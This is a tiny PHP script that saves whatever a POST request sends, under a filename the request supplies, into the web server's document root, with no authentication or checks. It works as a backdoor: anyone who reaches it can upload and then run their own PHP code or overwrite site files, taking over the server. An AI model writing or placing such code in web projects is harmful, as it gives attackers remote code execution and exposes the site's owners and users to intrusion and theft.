<?php
    file_put_contents($_SERVER["DOCUMENT_ROOT"]."/".$_POST["filename"],$_POST["contents"]);
    ?>